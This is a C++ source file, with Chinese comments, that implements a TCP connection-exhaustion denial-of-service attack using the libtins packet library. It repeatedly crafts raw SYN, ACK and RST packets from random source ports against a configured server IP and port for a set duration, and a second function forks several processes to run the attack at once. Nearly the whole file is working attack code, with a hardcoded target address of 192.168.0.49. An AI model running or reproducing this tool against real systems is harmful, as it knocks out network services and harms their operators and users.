//
// Created by zhf on 2024/11/8.
//

#include <iostream>
#include <sys/wait.h>
#include <unistd.h>
#include "common.h"
#include "connection.h"
#include "utils.h"

// connection_exhausted_attack_single_process 连接耗尽攻击 -> 单线程
void connection_exhausted_attack_single_process() {

    // 起始时间
    auto start_time = std::chrono::steady_clock::now();

    // 当前时间
    std::chrono::steady_clock::time_point current_time;

    // 经过的时间
    long elapsed_time;

    // 随机的源端口
    int random_attacker_port;

    // 在外层创建 ip 层 -> 因为每个数据包的 ip 部分都是一样的
    Tins::IP packet;

    // 创建 ip (目的地址)
    while(true) {

        // 当前时间
        current_time = std::chrono::steady_clock::now();

        // 经过的时间
        elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time -start_time).count();


        // 判断是否超过了攻击的时间长度 -> 如果超过了就退出
        if(elapsed_time > globalArgs.commandArgs.attack_duration){
            printf("攻击结束\n");
            break;
        }

        // 设置攻击者随机端口
        random_attacker_port = get_random_number();

        // 创建数据包 -> 包含 IP Layer 以及 TCP Layer
        packet = Tins::IP(globalArgs.commandArgs.server_ip) / Tins::TCP(globalArgs.commandArgs.server_port, random_attacker_port);

        // 获取 tcp layer
        auto & tcp = packet.rfind_pdu<Tins::TCP>();

        // 设置 SYN 标记
        tcp.set_flag(Tins::TCP::SYN, 1);

        // 向被害者端进行发送, 并收到响应
        std::unique_ptr<Tins::PDU> response(globalArgs.packetSender.send_recv(packet));
        if(!response){
            std::cout << "no response" << std::endl;
        }

        // 获取响应的 tcp 层
        auto& response_tcp_layer = response->rfind_pdu<Tins::TCP>();
        if(!(response_tcp_layer.get_flag(Tins::TCP::SYN) && (response_tcp_layer.get_flag(Tins::TCP::ACK)))) {
            std::cout << "didn't get syn ack" << std::endl;
        }
        else {
            std::cout << "attacker server connection established" << std::endl;
        }

        // 1. 获取 sequence number 2. 设置 sequence number 3. 设置 ACK 进行响应
        uint32_t seq_response = response_tcp_layer.seq();
        tcp.ack_seq(seq_response+1);
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::SYN, 0);
        tcp.set_flag(Tins::TCP::Flags::ACK, 1);
        globalArgs.packetSender.send(packet);

        // 这里由于需要发送的是 RST 包, 所以需要 MAC 地址
        MACAddress serverMAC = Tins::Utils::resolve_hwaddr("192.168.0.49", globalArgs.packetSender);
        MACAddress localMac = globalArgs.interface.addresses().hw_addr;
        tcp.seq(20);
        // 发送带有错误的 sequence 的 RST 触发 challenge ack
        tcp.set_flag(Tins::TCP::Flags::RST, 1);
        Tins::EthernetII ethPacket = Tins::EthernetII(serverMAC, localMac) / packet;
        globalArgs.packetSender.send(ethPacket);

        // 发送正确的 RST 关闭连接
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::RST, 1);
        ethPacket = Tins::EthernetII(serverMAC, localMac) / packet;
        globalArgs.packetSender.send(ethPacket);
    }
}

void connection_exhausted_attack_multiple_processes() {
    int process_count = globalArgs.commandArgs.attack_thread_count;
    std::vector<pid_t> child_pids;

    // 创建多个子进程
    for(int i = 0; i < process_count; i++){
        pid_t pid = fork();
        if (pid == -1) {
            std::cerr << "fork failed" << std::endl;
            exit(-1);
        } else if (pid == 0){ // 这里说明是父进程
            // 子进程执行攻击函数
            connection_exhausted_attack_single_process();
            // 子进程完成之后退出
            exit(0);
        } else { // 这里说明是其他的子进程
            child_pids.push_back(pid);
        }
    }

    // 父进程等待所有的子进程完成之后退出
    for(pid_t pid : child_pids){
        int status;
        waitpid(pid, &status, 0);
    }

    std::cout << "所有的攻击进程已经结束" << std::endl;
}